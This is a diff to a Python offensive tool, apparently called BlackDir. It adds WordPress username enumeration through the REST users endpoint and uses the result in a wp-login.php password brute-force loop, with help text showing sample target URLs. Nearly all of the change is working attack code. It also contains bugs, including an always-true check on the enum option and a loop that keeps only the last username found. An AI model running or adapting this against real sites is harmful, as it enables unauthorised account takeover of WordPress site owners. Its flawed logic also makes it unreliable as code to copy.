@@ -9,6 +9,7 @@
 """
 import time
 from urllib import request
+import json
 from hashlib import *
 from urllib.parse import urlsplit
 import urllib.parse as urlparse
@@ -66,7 +67,7 @@ def logo():
  | |_) | | __ _  ___| | _| |  | |_ _ __  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __
  |  _ <| |/ _` |/ __| |/ / |  | | | '__| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
  | |_) | | (_| | (__|   <| |__| | | |    | |  | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
- |____/|_|\__,_|\___|_|\_\_____/|_|_|    |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\ version:2.5
+ |____/|_|\__,_|\___|_|\_\_____/|_|_|    |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\ version:2.8
 
  -----------------------------------------------------------------------------------------------------------
     The Programmer of this tool is not irresponsible about any damage Or leak induced by the user
@@ -651,36 +652,66 @@ def hash_identifier(hashing):
         print(colored("Bit length:"), 128 * 4)
     else:
         print(colored("Not Found !","red"))
-def wordpress(url,username,password):
+def enumerate(url):
+    try:
+        req_check = requests.get(url)
+        if req_check.status_code == 200:
+            u_json = json.loads(req_check.text)
+            for x in range(0,len(u_json)):
+                user=u_json[x]['slug']
+            return user
+        else:
+            return None
+    except requests.exceptions.ConnectionError:
+        return None
+def wordpress(url,username,password,enum):
+    user_list=[]
     send = {}
+    user = None
+    user_json = url+"/wp-json/wp/v2/users"
     print(colored("[!] Start Brute Force","red"))
+    print(colored("[!] Start Enumeration", "red"))
     time.sleep(2)
-    if username ==None and password == None:
-        u_file = open("username.txt", "r")
+    if enum == "use" or "Use":
+        user =enumerate(user_json)
+    if user!=None and password == None :
+        user_list.append(user)
+        print(colored("[+] Found User:","green"),user)
         p_file = open("password.txt", "r")
-        print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
-        print(colored("File For Users:","green"),os.getcwd()+"/"+"password.txt")
-    elif username != None and password == None:
-        u_file = open(username,"r")
-        p_file = open("password.txt", "r")
-        print(colored("File For Users:","green"),username)
-        print(colored("File For Users:","green"), os.getcwd()+"/"+ "password.txt")
-    elif username == None and password !=None:
-        u_file = open("username.txt", "r")
-        p_file = open(password,"r")
-        print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
-        print(colored("File For Users:","green"),password)
-    else:
-        u_file = open(username, "r")
+        print(colored("File For Passwords:", "green"), os.getcwd() + "/" + "password.txt")
+    elif user != None and password != None:
+        user_list.append(user)
+        print(colored("[+] Found User:","green"),user)
         p_file = open(password, "r")
-        print(colored("File For Users:","green"),username)
-        print(colored("File For Users:","green"),password)
+        print(colored("File For Passwords:", "green"), password)
+    else:
+        if username ==None and password == None:
+            user_list = open("username.txt", "r")
+            p_file = open("password.txt", "r")
+            print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
+            print(colored("File For Users:","green"),os.getcwd()+"/"+"password.txt")
+        elif username != None and password == None:
+            user_list = open(username,"r")
+            p_file = open("password.txt", "r")
+            print(colored("File For Users:","green"),username)
+            print(colored("File For Users:","green"), os.getcwd()+"/"+ "password.txt")
+        elif username == None and password !=None:
+            user_list = open("username.txt", "r")
+            p_file = open(password,"r")
+            print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
+            print(colored("File For Users:","green"),password)
+        else:
+            user_list = open(username, "r")
+            p_file = open(password, "r")
+            print(colored("File For Users:","green"),username)
+            print(colored("File For Users:","green"),password)
     time.sleep(2)
     url_edit = url+"/"+"wp-login.php"
     wp_admin = url+"/"+"wp-admin"
+
     url_req = requests.post(url_edit)
     if url_req.status_code == 200:
-        for usernames in u_file:
+        for usernames in user_list:
             usernames = usernames.strip()
             for passowrds in p_file:
                 passowrds = passowrds.strip()
@@ -701,7 +732,6 @@ def wordpress(url,username,password):
                     sessions.post(url_edit,headers=headers1,data=send)
                     response = sessions.get(wp_admin)
                 if url+"/wp-login.php?action=lostpassword" not in response.text:
-
                     print("Found !","Username:",usernames,"password:",passowrds)
                     exit(0)
                 else:
@@ -727,6 +757,10 @@ parser = argparse.ArgumentParser("""
 --word              : word you want encrypt
 --type              : select hash type like:md5,sha1,sha256,sha512
 --hash_type         : find Type of hash
+--wordpress         : link the site for BruteForce
+--ListPassword      : Directory For Your Password List
+--ListUsername      : Directory For Your Username List
+--enum              : For Extract Username By Enumreate
 ex:
 python3 BlackDir.py --spider http://google.com
 python3 BlackDir.py --dork inurl:admin/login.php --country sa --text product
@@ -744,6 +778,9 @@ python3 BlackDir.py --wordpress http://ebase.com/
 python3 BlackDir.py --wordpress http://ebase.com/ --ListUsername /root/Desktop/users.txt --ListPassowrd /root/Desktop/pass.txt
 python3 BlackDir.py --wordpress http://ebase.com/ --ListUsername /root/Desktop/users.txt 
 python3 BlackDir.py --wordpress http://ebase.com/ --ListPassword /root/Desktop/pass.txt
+python3 BlackDir.py --wordpress http://ebase.com/ --enum use
+
+
 """)
 parser.add_argument("-spider", "--spider")
 parser.add_argument("-list", "--list")
@@ -764,6 +801,7 @@ parser.add_argument("-hash_type","--hash_type")
 parser.add_argument("-wordpress","--wordpress")
 parser.add_argument("-ListUsername","--ListUsername")
 parser.add_argument("-ListPassword","--ListPassword")
+parser.add_argument("-enum","--enum")
 args = parser.parse_args()
 secure = None
 listuser = args.list
@@ -793,6 +831,7 @@ hash_ide = args.hash_type
 url_wordpress = args.wordpress
 usernames = args.ListUsername
 passwords = args.ListPassword
+enumx = args.enum
 if dork != None and url == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
     dorks(dork, site, text)
 elif url != None and dork == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
@@ -821,6 +860,6 @@ elif sql_inection == None and scanner == None and url == None and dork == None a
 elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide != None and url_wordpress ==None:
     hash_identifier(hash_ide)
 elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide == None and url_wordpress !=None:
-    wordpress(url_wordpress,usernames,passwords)
+    wordpress(url_wordpress,usernames,passwords,enumx)
 else:
     logo()
